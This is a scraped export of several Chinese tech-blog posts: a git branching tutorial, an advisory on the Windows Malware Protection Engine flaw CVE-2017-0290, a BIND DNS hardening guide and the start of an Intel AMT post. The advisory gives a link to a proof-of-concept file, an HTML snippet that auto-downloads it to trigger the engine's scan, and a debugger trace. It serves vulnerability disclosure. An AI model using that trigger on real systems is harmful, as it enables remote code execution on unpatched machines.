案例一：将现有文件夹加入到git远程仓库1、实例描述：将本地文件夹及文件夹中的内容加入到已有的远程仓库中。 2、操作步骤剖析：首先进入已存在的文件夹，然后对本地文件夹进行git初始化，接着添加远程仓库地址，将本地文件添加到本地缓存，然后确认，最后推送。 3、操作步骤详细介绍： 进入到已有文件夹 1cd _post 将现有目录文件夹进行初始化这将在当前目录下创建隐藏的文件夹.git，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。 1git init 添加远程git仓库以下为命令为添加远程仓库的方法，其中“origin” 为添加的远程仓库的短名字以方便记录。 1git remote add origin git@git.unixmen.cn:netb2c/blogs.git 将本地文件夹添加到跟踪 1git add . 提交描述信息 1git commit 将本地文件推送到远程仓库 1git push -u origin master 至此本案例操作完成，可通过web端查看项目提交结果，以上就是整个操作过程。 案例二：利用分支进行开发的工作流程1、案例描述：案例介绍利用git分支进行开发的工作流程的典型工作模式。 2、背景介绍：工作流程在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。Git 作为一个强大及方便易管源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，而工作流程有各式各样的用法，但也正因此使得在实际工作中如何上手使用变得很头大，让大家有效地合作，使得项目井井有条地发展下去。 3、利用分支进行开发的工作流程介绍： 长期分支 master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 短期分支 feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/bigchange，开发完成后合并回 develop 分支并且删除这个 feature 分支。相应的操作如下： 首先是新建分支 1git checkout -b feature/bigchange develop 然后开始写代码，提交，写代码，提交。。。然后直到feature 开发完成，合并回 develop，具体操作如下：接着切换到develop分支下1git checkout develop 然后开始合并，注：合并的时候务必加上 –no-ff，以保持分支的合并历史1git merge --no-ff feature/bigchange 最后删除这个分支1git branch -d feature/bigchange 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 假设当前在 feature/bigchange 分支1git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20170525，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。 相应操作如下：新建release分支 1git checkout -b release/20170525 develop 修复 bug、检查没问题后合并到 master 分支并删除12git checkout mastergit merge --no-ff release/20170525 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支.响应操作如下：12git checkout developgit merge --no-ff release/20170525 到此，这个 release 分支完成了它的使命，可以被删除了1git branch -d release/20170525 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/fix，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。 相应操作如下：新建分支 1git checkout -b hotfix/fix master 修完 bug 并测试完成后，分别与master和develop分支进行合并1234git checkout mastergit merge --no-ff hotfix/fixgit checkout developgit merge --no-ff hotfix/fix 然后可以删除分支1git branch -d hotfix/fix 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 proj 分支proj 分支为项目分支。所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。 相应操作如下：新建分支1git checkout -b proj/xxx master 定制。。。如果 master 分支有更新 12git checkout proj/xxx mastergit merge --no-ff master 至此本案例介绍完成，如果大家遵从这样的一个工作流程，相信大家都能成为一个高效的团队。 至此本文介绍完毕,如有问题及不足欢迎与我联络。 参考文献：http://baike.baidu.com/item/GIT/12647237 https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）","slug":"Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）","date":"2017-05-10T05:12:14.000Z","updated":"2017-05-10T05:14:22.400Z","comments":true,"path":"2017/05/10/Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）/","link":"","permalink":"http://blog.unixmen.cn/2017/05/10/Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）/","excerpt":"","text":"文章简述微软昨天发布了一个安全公告——微软自家的恶意程序防护引擎出现高危安全漏洞。影响到包括MSE、Windows Defender防火墙等在内的产品，危害性还是相当严重的。微软当前已经提供了升级以修复漏洞，并表示没有证据表明攻击者已经利用该漏洞。 漏洞编号：CVE-2017-0290 漏洞危害程度：Critical，严重 漏洞概述：简单说来，当微软恶意程序防护引擎（Microsoft Malware Protection Engine）检测某个恶意构造的文件后，攻击者就能利用漏洞实现远程代码执行。成功利用该漏洞，攻击者就能在LocalSystem帐号安全上下文执行任意代码，并控制系统。 攻击者随后就能安装程序；查看、更改或删除数据；或者以完整的用户权限来构建新账户。 攻击者实际上有很多种方法让微软的恶意程序保护引擎扫描到恶意构建的文件，比如目标用户浏览某个网站的时候就能分发恶意部署文件，或者通过邮件信息、即时通讯消息——在实时扫描开启的情况下，甚至不需要用户打开这些文件，微软恶意程序防护引擎就会对其进行扫描。 影响范围：很多微软的反恶意程序产品都在使用微软恶意程序防护引擎。鉴于其中包含Windows 7/8/8.1/10/Server 2016中就默认安装的反恶意程序产品，该漏洞应该是非常严重。微软在其安全公告页面中列出了受影响产品，包括： Microsoft Forefront Endpoint Protection 2010Microsoft Endpoint ProtectionMicrosoft Forefront Security for SharePoint Service Pack 3Microsoft System Center Endpoint ProtectionMicrosoft Security EssentialsWindows Defender for Windows 7Windows Defender for Windows 8.1Windows Defender for Windows RT 8.1Windows Defender for Windows 10, Windows 10 1511, Windows 10 1607, Windows Server 2016, Windows 10 1703Windows Intune Endpoint Protection 漏洞详情：具体来说，MsMpEng是恶意程序防护服务，Windows 8/8.1/10/Server 2012等都默认启用。MSE（Microsoft Security Essentials）、系统中心终端防护和微软的各种安全产品都采用此核心引擎。 MsMpEng以AUTHORITY\\SYSTEM权限运行，无沙盒，通过Windows服务（如Exchange、IIS等）在无需身份认证的情况下可远程访问。 在工作站之上，攻击者给用户发送邮件（甚至不需要阅读邮件或打开附件）、在浏览器中访问链接、使用即时通讯等，就能访问mpengine（MsMpEng用于扫描和分析的核心组件）。因为MsMpEng采用文件系统minifilter来拦截以及检查所有的文件系统活动，所以给硬盘的任意位置写入相应内容就能实现mpengine中函数的访问。 鉴于其高权限、可访问及普遍存在性，MsMpEng中的这个漏洞还是极为严重的。 不难发现mpengine本身就是个很大的攻击面，其中包含很多专门的文件格式、可执行封装包、cryptor、完整系统模拟器的Handler，还有各种架构和语言的解释器。所有这些代码，远程攻击者都是可以访问的。 其中NScript是mpengine的一个组件，这个组件用于评估任意看起来像是JS的文件系统或网络活动。值得一提的是，这是个无沙盒环境、高权限的JavaScript interpreter——用于评估不受信任的代码。 谷歌的研究人员写了个工具，通过代码shell访问NScript。发现函数JsDelegateObject_Error::toString()会从中读取“message”属性，但在传递给JsRuntimeState::triggerShortStrEvent()之前未能验证属性类型。其默认假定message是个字符串，但实际上可以是任意类型。这就能够让攻击者传递其它任意对象。 更多详情可参见Chromium。其中也提供了漏洞再现的方法。 若要再现该漏洞，可点击这里下载：https://bugs.chromium.org/p/project-zero/issues/attachment?aid=283405 。访问包含下述代码的网站后，1234&lt;a href=&quot;testcase.txt&quot; download id=link&gt;&lt;script&gt;document.getElementById(&quot;link&quot;).click();&lt;/script&gt; 捕捉到的debug会话：123456789101112131415161718192021222324252627282930313233343536373: kd&gt; !processPROCESS 8805fd28 SessionId: 0 Cid: 0afc Peb: 7ffdf000 ParentCid: 01c8 DirBase: bded14e0 ObjectTable: bfb99640 HandleCount: 433. Image: MsMpEng.exe3: kd&gt; !token -n_EPROCESS 8805fd28, _TOKEN 00000000TS Session ID: 0User: S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)3: kd&gt; .lasteventLast event: Access violation - code c0000005 (first chance) debugger time: Fri May 5 18:22:14.740 2017 (UTC - 7:00)3: kd&gt; reax=00000010 ebx=1156c968 ecx=41414141 edx=115730f8 esi=68bd9100 edi=41414141eip=68b1f5f2 esp=0208e12c ebp=0208e134 iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010293mpengine!FreeSigFiles+0xec822:001b:68b1f5f2 8b07 mov eax,dword ptr [edi] ds:0023:41414141=????????3: kd&gt; lmv mmpenginestart end module name68790000 6917a000 mpengine (export symbols) mpengine.dll Loaded symbol image file: mpengine.dll Image path: c:\\ProgramData\\Microsoft\\Microsoft Antimalware\\Definition Updates\\&#123;1C2B7358-645B-41D0-9E79-5FA3E5C4EB51&#125;\\mpengine.dll Image name: mpengine.dll Timestamp: Thu Apr 06 16:05:37 2017 (58E6C9C1) CheckSum: 00A1330D ImageSize: 009EA000 Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e43: kd&gt; umpengine!FreeSigFiles+0xec822:001b:68b1f5f2 8b07 mov eax,dword ptr [edi]001b:68b1f5f4 56 push esi001b:68b1f5f5 8b7008 mov esi,dword ptr [eax+8]001b:68b1f5f8 8bce mov ecx,esi001b:68b1f5fa ff15c0450e69 call dword ptr [mpengine!MpContainerWrite+0x35f3a0 (690e45c0)]001b:68b1f600 8bcf mov ecx,edi001b:68b1f602 ffd6 call esi &lt;--- Jump to attacker controlled address001b:68b1f604 5e pop esi 值得一提的是，在执行JS之前，mpengine采用各种启发式方案来决定是否有必要作评估。其中一个启发式方案会评估文件熵——不过研究人员发现其实只要附加上足够多的注释，也就能够触发所谓的“评估”过程了。 修复方案：微软在安全公告中提到，终端用户和企业管理员不需要进行额外的操作，微软恶意程序引擎本身自动检测和更新部署机制会在48小时内应用更新。具体更新时间，视所用软件、互联网连接和基建配置而定。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"Intel AMT 漏洞","slug":"Intel-AMT-漏洞","permalink":"http://blog.unixmen.cn/tags/Intel-AMT-漏洞/"}]},{"title":"全面提升BIND DNS服务器安全","slug":"全面提升BIND-DNS服务器安全","date":"2017-05-09T10:37:54.000Z","updated":"2017-05-10T09:51:38.056Z","comments":true,"path":"2017/05/09/全面提升BIND-DNS服务器安全/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/全面提升BIND-DNS服务器安全/","excerpt":"","text":"文章简介本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固 DNS服务所面临的安全隐患互联网上DNS服务器的事实标准就是ISC的BIND，BillManning对in-addr域的调查发现，有95%的域名服务器(2的2000次方个服务器中)使用的是各种版本的“bind”。这其中包括了所有的DNS根服务器，而这些根服务器对整个服务器的正常运转起着至关重要的作用。 DNS服务所面临的安全隐患包括： DNS欺骗（DNSSpoffing） 拒绝服务（Denialofservice，DoS）攻击 分布式拒绝服务攻击（Distributed Denial of Service，DDoS） 缓冲区漏洞溢出攻击（BufferOverflow） 1.DNS欺骗DNS欺骗即域名信息欺骗是最常见的DNS安全问题。当一个DNS服务器掉入陷阱，使用了来自一个恶意DNS服务器的错误信息，那么该DNS服务器就被欺骗了。DNS欺骗会使那些易受攻击的DNS服务器产生许多安全问题，例如：将用户引导到错误的互联网站点，或者发送一个电子邮件到一个未经授权的邮件服务器。网络攻击者通常通过两种方法进行DNS欺骗。 （1）缓存感染黑客会熟练的使用DNS请求，将数据放入一个没有设防的DNS服务器的缓存当中。这些缓存信息会在客户进行DNS访问时返回给客户，从而将客户引导到入侵者所设置的运行木马的Web服务器或邮件服务器上，然后黑客从这些服务器上获取用户信息。 （2）DNS信息劫持入侵者通过监听客户端和DNS服务器的对话，通过猜测服务器响应给客户端的DNS查询ID。每个DNS报文包括一个相关联的16位ID号，DNS服务器根据这个ID号获取请求源位置。黑客在DNS服务器之前将虚假的响应交给用户，从而欺骗客户端去访问恶意的网站。 （3）DNS重定向攻击者能够将DNS名称查询重定向到恶意DNS服务器。这样攻击者可以获得DNS服务器的写权限。 2.拒绝服务攻击黑客主要利用一些DNS软件的漏洞，如在BIND9版本（版本9.2.0以前的9系列）如果有人向运行BIND的设备发送特定的DNS数据包请求，BIND就会自动关闭。攻击者只能使BIND关闭，而无法在服务器上执行任意命令。如果得不到DNS服务，那么就会产生一场灾难：由于网址不能解析为IP地址，用户将无方访问互联网。这样，DNS产生的问题就好像是互联网本身所产生的问题，这将导致大量的混乱。 3.分布式拒绝服务攻击DDOS攻击通过使用攻击者控制的几十台或几百台计算机攻击一台主机，使得服务拒绝攻击更难以防范：使服务拒绝攻击更难以通过阻塞单一攻击源主机的数据流，来防范服务拒绝攻击。SynFlood是针对DNS服务器最常见的分布式拒绝服务攻击。SYNFlood攻击利用的是IPv4中TCP协议的三次握手（Three-WayHandshake）过程进行的攻击。大家知道协议规定，如果一端想向另一端发起TCP连接，它需要首先发送TCPSYN包到对方，对方收到后发送一个TCPSYN+ACK包回来，发起方再发送TCPACK包回去，这样三次握手就结束了。我们把TCP连接的发起方叫作”TCP客户机（TCPClient）”，TCP连接的接收方叫作”TCP服务器（TCPServer）”。 值得注意的是在TCP服务器收到TCPSYNrequest包时，在发送TCPSYN+ACK包回TCP客户机前，TCP服务器要先分配好一个数据区专门服务于这个即将形成的TCP连接。一般把收到SYN包而还未收到ACK包时的连接状态成为半开连接（Half-openConnection）。在最常见的SYNFlood攻击中，攻击者在短时间内发送大量的TCPSYN包给受害者，这时攻击者是TCP客户机，受害者是TCP服务器。根据上面的描述，受害者会为每个TCPSYN包分配一个特定的数据区，只要这些SYN包具有不同的源地址（这一点对于攻击者来说是很容易伪造的）。这将给TCP服务器系统造成很大的系统负担，最终导致系统不能正常工作。 4.缓冲区漏洞溢出攻击黑客利用DNS服务器软件存在漏洞，比如对特定的输入没有进行严格检查，那幺有可能被攻击者利用，攻击者构造特殊的畸形数据包来对DNS服务器进行缓冲区溢出攻击。如果这一攻击成功，就会造成DNS服务停止，或者攻击者能够在DNS服务器上执行其设定的任意代码。例如,前一阵子针对Linux平台的BIND的攻击(e.g.Lionworm)程序,就是利用某些版本的BIND漏洞,取得root权限,一旦入侵完成之后,入侵者就可以完全控制整个相关的网络系统,影响非常严重。主要包括： （1）更改MX记录，造成邮件被截获、修改或删除。 （2）更改A记录，使您的WWW服务器的域名指向黑客的具有同样WWW内容的主机，诱使访问者登录，获取访问者的密码等相关信息。添加A记录，使黑客的主机拥有被相信的域名，以此来入侵通过启用域名信任机制的系统。 （3）利用这台主机作为攻击其他机器的“跳板”。 应对以上这些安全隐患方法有两个最有效的原则：1.选择安全没有缺陷的DNS版本：BIND主要分为三个版本： （1）v4，1998年多数UNIX捆绑的是BIND4，已经被多数厂商抛弃了，除了OpenBSD还在使用。OpenBSD核心人为BIND8过于复杂和不安全，所以继续使用BIND4。这样一来BIND8/9的很多优点都不包括在v4中。 （2）v8，就是如今使用最多最广的版本，其详细内容可以参阅“BIND8+域名服务器安全增强”http://security.nsfocus.com/showQueryL.asplibID=530 （3）v9，最新版本的BIND，全部重新写过，免费（但是由商业公司资助），BIND9在2000年十月份推出，根据调查v9版本的BIND是最安全的，它的最新安全版本在其官方网站：http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。 2.保持DNS服务器配置正确、可靠这一点相对困难。Linux上的域名服务由named守护进程控制，该进程从主文件：/etc/named.conf中获取信息。它包括一组将主机名称映射为IP地址的各种文件。Linux下主要DNS配置文件见表一、二、三：表－1DNS主要配置文件点击看大图表－2named配置文件族点击看大图named.conf时DNS中的核心它的配置见表三：表－3named.conf文件的配置点击看大图可以看到DNS配置文件是一个复杂的系统。伴随DNS建立出现的许多问题都会引起相同的结果，但起因却不同。但大多数问题是由于配置文件中的语法错误而导致的。DNS是一组文件构成的，所以需要不同工具检查对应文件。一个配置存在缺陷的DNS服务器会存在很大的安全漏洞。这里可以通过一些工具：nslookup、dig、named-checkzone、host、named-checkconf、dlint等对DNS配置文件进行检查。其中安装BIND软件包时自动安装的工具包括：nslookup、dig、named-checkzone、host、named-checkconf。dlint是一个专门检查DNS配置文件开放源代码软件。可以在http://www.domtools.com/dns/dlint.shtml下载。在维护DNS服务器时，网管员希望知道到底是哪些用户在使用DNS服务器，同时也希望能对DNS状态查询做一个统计。这里我们可以使用dnstop查询DNS服务器状态：软件下载和安装：运行软件：如果想查看通过eth0的DNS网络流量可以使用命令 在运行dnstop的过程中，可以敲入如下命令：s，d，t，1，2，3,ctrl+r，ctrl+x，以交互方式来显示不同的信息。1－（TLD）记录查询的顶级域名，2－（SLD）记录查询的二级域名，3－（SLD）记录查询的三级域名，s－（Source）记录发送dns查询的客户端ip地址表，d－（Destinations）记录dns查询的目的服务器的ip地址表，t－（QueryType）记录查询详细类型。ctrl+r－重新纪录。ctrl+x－退出。更详细信息可以查看mandnstop。 安全加固下面以使用最为广泛的Unix类DNS软件BIND为例，介绍如何配置一个安全DNS服务器。本文以RHEL4.0为工作平台。 1.隔离DNS服务器首先应该隔离BIND服务器，不应该在DNS服务器上跑其他服务，尽量允许普通用户登陆。减少其它的服务可以缩小被攻击的可能性，比如混合攻击。 2.隐藏BIND的版本号通常软件的BUG信息是和特定版本相关的，因此版本号是黑客寻求最有价值的信息。黑客使用dig命令可以查询BIND的版本号，然后黑客就知道这个软件有那些漏洞。因此随意公开版本号是不明智的。隐藏BIND版本号比较简单，修改配置文件：/etc/named.conf，在option部分添加version声明将BIND的版本号信息覆盖。例如使用下面的配置声明，当有人请求版本信息时，迫使nmaed显示：“Unsupportedonthisplatform” 3.避免透露服务器信息和版本号一样，也不要轻易透露服务器其他信息。为了让潜在的黑客更难得手，建议不要在DNS配置文件中使用这HINFO和TXT两个资源记录。 4.关闭DNS服务器的gluefetching选项当DNS服务器返回一个域的域名服务器纪录并且域名服务器纪录中没有A纪录，DNS服务器会尝试获取一个纪录。就称为gluefetching,攻击者可以利用它进行DNS欺骗。关闭gluefetching是一个好方法，修改配置文件：/etc/named.conf.加入一行： 5.使用非root权限运行BIND在Linux内核2.3.99以后的版本中，可以以－u选项以非root权限运行BIND。命令如下： 上面的命令表示以nobody用户身份运行BIND。使用nobody身份运行能够降低缓冲区溢出攻击所带来的危险。 6.控制区域(zone)传输默认情况下BIND的区域(zone)传输是全部开放的，如果没有限制那么DNS服务器允许对任何人都进行区域传输的话，那么网络架构中的主机名、主机IP列表、路由器名和路由IP列表，甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到。因此，要对区域传输进行必要的限制。可以通过在／etc／named．conf文件当中添加以下语句来限制区域传输：这样只有IP地址为：从192.168.0.52到192.168.0.109的主机能够同DNS服务器进行区域传输。 7.请求限制如果任何人都可以对DNS服务器发出请求，那么这是不能接受的。限制DNS服务器的服务范围很重要，可以把许多入侵者据之门外。修改BIND的配置文件：/etc/named.conf加入以下内容： 这样所有的用户都可以访问yourdomain.com的DNS服务器，但是只有168.192.1.0网段的主机用户可以请求DNS服务器的任意服务。另外也不要允许其他网段的主机进行递归询问，在上面文件最后加入一行即可： 8.其他強化措施：（1）使用存取控制清单(AccessControlLists)，主要目的在于产生地址配对清单。语法：acl“name”{address_match_list}; address_match_list：地址匹对清单。例子：acl“mis”{192.168.200.15,192.168.143.192/26}; （2）使用Forwarders代询服务器机制，它将自己无法解析的查询转送到某特定的服务器。语法：forwardersip_address_liest例子：以下是建议的forwarders设定(在/etc/named.conf中) orwarders{//指定提供查询的上层DNS。 www.twnic.net.tw;//到上层(twnic)的DNS查询。 };需注意的是通常我们指定的是到本身上一层dns，但也可能因dns缓存有误而转送到错误的服务器上。 （3）使用allow-transfer：目的在于只允许授权的网域主机能更新、读取DNS辖区内的记录。语法：allow-transfer{&lt;address_match_list&gt;};例子：address_match_list：允许进行DNS辖区数据传输主机的IP列表。 （4）allow-update：目的在于指定能向本dns服务器提交动态dns更新的主机语法：allow-update{&lt;address_match_list&gt;};例子：address_match_list：允许能向本DNS服务器提交动态DNS更新的主机IP列表 9.使用DNSSECDNS欺骗spoofing对目前网络应用,最大的冲击在于冒名者借着提供假的网域名称与网址的对照信息,可以将不知情用户的网页联机,导引到错误的网站,原本属于用户的电子邮件也可能因而遗失,甚而进一步空开成为阻断服务的攻击。所幸,目前较新的BIND版本,针对这一类问题,已经有加入许多改进的方法,不过真正的解决方案,则有赖封包认证机制的建立与推动。DNSSEC就是试图解决这一类问题的全新机制,BIND9已经完整加以设计并完成。DNSSEC引入两个全新的资源记录类型：KEY和SIG，允许客户端和域名服务器对任何DNS数据的来源进行密码验证。DNSSEC主要依靠公钥技术对于包含在DNS中的信息创建密码签名。密码签名通过计算出一个密码hash数来提供DNS中数据的完整性，并将该hash数封装进行保护。私/公钥对中的私钥用来封装hash数，然后可以用公钥把hash数译出来。如果这个译出的hash值匹配接收者刚刚计算出来的hash树，那么表明数据是完整的。不管译出来的hash数和计算出来的hash数是否匹配，对于密码签名这种认证方式都是绝对正确的，因为公钥仅仅用于解密合法的hash数，所以只有拥有私钥的拥有者可以加密这些信息。 10.为DNS服务器配置DNSFloodDetectorDNSFloodDetector是针对DNS服务器的SynFlood攻击检测工具，用于侦测恶意的使用DNS查询功能。它利用libpcap的网络数据包捕获函数功能检测网络流量来判断是否受到SynFlood攻击，DNSFloodDetctor运行方式分成：守护进程（daemon）模式和后台（bindsnap）模式。以守护进程模式运行时它会通过syslog发出警示(/var/log/messages)，以后台模式运行时可以得到实时的查询状态。下载安装： 命令格式:dns_flood_detector[选项]主要选项：-iIFNAME监听某一特定接口。-tN当每秒查询数量超过N值时发出警示.-aN经过N秒后重置警示。-wN每隔N秒显示状态。-xN创建N个buckets。-mN每隔N秒显示所有状态。-b以后台模式执行(bindsnap)。-d以守护进程模式执行(daemon)。-v显示较多的输出信息。-h显示使用方式。 应用实例:dns_flood_detector-b-v-v–t3见下图。dns_flood_detector工作界面 messages的纪录：以守护进程模式执行,纪录每秒超过3次查询的纪录,显示最多信息,包含APTRMX纪录等。 11.建立完整的域名服务器Linux下的DNS服务器用来存储主机的域名信息。包括三种：（1）惟高速存域名服务器（Cache-onlyserver）惟高速存域名服务器（Cache-onlyserver）不包含域名数据库。它从某个远程服务器取得每次域名服务器查询的回答，一旦取得一个回答，就将它放入高速缓存中。（2）主域名服务器（PrimaryNameserver）主域名服务器是特定域所有信息的权威来源。它从域管理员构造的本地文件中加载域信息，该“区文件”包含着服务器具有管理权的部分域结构的最精确的信息。主域名服务器需要配置包括一组完整的文件：主配置文件（named.conf）、正向域的区文件(named.hosts)、反向域的区文件(named.rev)、高速缓存初始化文件(named.ca)和回送文件(named.local)。（3）辅助域名服务器（SecondNameServer）辅助域名服务器用来从主服务器中转移一整套域信息。辅助域名服务器是可选的配置选项。区文件是从主服务器转移出的，作为磁盘文件保存在辅助域名服务器中。辅助域名服务器不需配置本地区文件。说明：多数域名服务器要根据网络实际情况将以上三种服务器组合，进行合理配置。所有的域名服务器都需要一个设置惟高速缓存服务器提供名字解析。一个域只能建立一个主域名服务器，另外至少要创建一个辅助域名服务器作为主域名服务器的备份。一个域的主服务器可以是其他域的辅助域名服务器。为了提高域名系统的可靠性，应建立辅域名服务器。当主域名服务器不能正常工作的情况下，能够替代主域名服务器对外提供不间断的服务。 12.增强DNS服务器的防范Dos/DDoS功能1.使用SYNcookie SYNCookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYNFlood攻击的一种手段。它的原理是，在TCP服务器收到TCPSYN包并返回TCPSYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCPACK包时，TCP服务器在根据那个cookie值检查这个TCPACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。在linux下以root权限执行： 2.增大backlog通过增加backlog的数值，可以一定程度减缓大量SYN请求导致TCP连接阻塞的状况，一般这个数值系统默认是1024，可以增加到1280至2048： 这样在强度不是很高的攻击下，系统响应能力提高了一点。3.缩短retries次数Linux系统默认的tcp_synack_retries是5次，将这个数值减少可以提高系统响应能力，为2次： 修改后，SYN_RECV的数量有了少量减少，系统响应也快了一些。4.限制SYN频率目前比较有效的是对SYN的频率和次数进行限制，这样最大限度的控制了单个IP地址发动攻击的能力。例如将SYN请求的次数限制在30次每分钟，系统默认是5次/秒可以将burst从默认的5个降低到2个。 进行此操作后正常的用户无任何感觉上的差异，而并发的SYN请求量下降了不少，服务响应基本正常了。5.防范SYNAttack攻击SYNAttack”是一种拒绝服务（DoS）的攻击方式，会消耗掉系统中的所有资源，迫使服务器重新启动。使用下面的命令：1#echo1&gt;/proc/sys/net/ipv4/tcp_syncookies 把这个命令加入”/etc/rc.d/rc.local”文件中，等下次系统重新启动的时候就可以自动生效。 13.使用分布式DNS负载均衡在众多的负载均衡架构中，基于DNS解析的负载均衡本身就拥有对DDOS（SYNFlood）的免疫力，基于DNS解析的负载均衡能将用户的请求分配到不同IP的服务器主机上，攻击者攻击的永远只是其中一台服务器，一来这样增加了攻击者的成本，二来过多的DNS请求可以帮助我们追查攻击者的真正踪迹（DNS请求不同于SYN攻击，是需要返回数据的，所以很难进行IP伪装）。但是基于DNS解析的负载均衡成本很高。很多中小公司没有部署这个技术。 14.防范对于DNS服务器网络嗅探器技术被广泛应用于网络维护和管理方面，它工作的时候就像一部被动声纳，默默的接收看来自网络的各种信息，通过对这些数据的分析，网络管理员可以深入了解网络当前的运行状况，以便找出网络中的漏洞。在网络安全日益被注意的今天.我们不但要正确使用嗅探器。还要合理防范嗅探器的危害.嗅探器能够造成很大的安全危害，主要是因为它们不容易被发现。对于一个安全性能要求很严格的企业，同时使用安全的拓扑结构、会话加密、使用静态的ARP地址是有必要的。 15.及时更新系统补丁你应该经常到你所安装的系统发行商的主页上去找最新的补丁。目前操作系统维护主要分两种模式：对于私有操作系统（Windows/Solaris等）由于个人用户不能直接接触其源代码，其代码由公司内部开发人员维护，其安全性由同样的团队保证，内核的修正与其他应用程序一样，以patch/SP包的方式发布。对于Linux这样的开放式系统，是一种开放的结构。应该说，开放的模式是双刃剑。从机制上讲，全世界的开发人员都能获得源代码，从而找出其中的纰漏，似乎安全性应该更好;但是同时，如果网络管理人员不能及时更新内核，也会留下安全隐患。如果你是一个Linux网管员，你经常需要上相应的网站看，是否有补丁，是否有了bugfix，是否需要升级。Linux服务器运行的软件主要包括：Bind，Apache等软件大都是开源软件，而且都在不停升级，稳定版和测试版交替出现。在www.apache.org上，最新的changeLog中都写着：bugfix,securitybugfix的字样。所以Linux网管员要经常的关注相关网站及时升级或添加补丁。 ##总结：DNS是网络服务的基础建设，要长期不断地保持其正常运作，每一个DNS服务器都应该定期检测。域名系统的配置和管理是一项比较复杂和繁琐的系统管理任务，它对整个网络的运行影响极大。为了保证DNS服务器的安全运行，不仅要使用可靠的服务器软件版本，而且要对DNS服务器进行安全配置，同时还要跟踪服务器软件和操作系统的各种漏洞。","raw":null,"content":null,"categories":[{"name":"安全","slug":"安全","permalink":"http://blog.unixmen.cn/categories/安全/"},{"name":"bind","slug":"安全/bind","permalink":"http://blog.unixmen.cn/categories/安全/bind/"},{"name":"DNS","slug":"安全/bind/DNS","permalink":"http://blog.unixmen.cn/categories/安全/bind/DNS/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://blog.unixmen.cn/tags/安全/"},{"name":"bind","slug":"bind","permalink":"http://blog.unixmen.cn/tags/bind/"},{"name":"DNS攻击","slug":"DNS攻击","permalink":"http://blog.unixmen.cn/tags/DNS攻击/"},{"name":"DNS安全加固","slug":"DNS安全加固","permalink":"http://blog.unixmen.cn/tags/DNS安全加固/"}]},{"title":"英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析","slug":"英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析","date":"2017-05-09T09:20:23.000Z","updated":"2017-05-09T09:21:25.204Z","comments":true,"path":"2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/","excerpt":"","text":"文章简述本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。 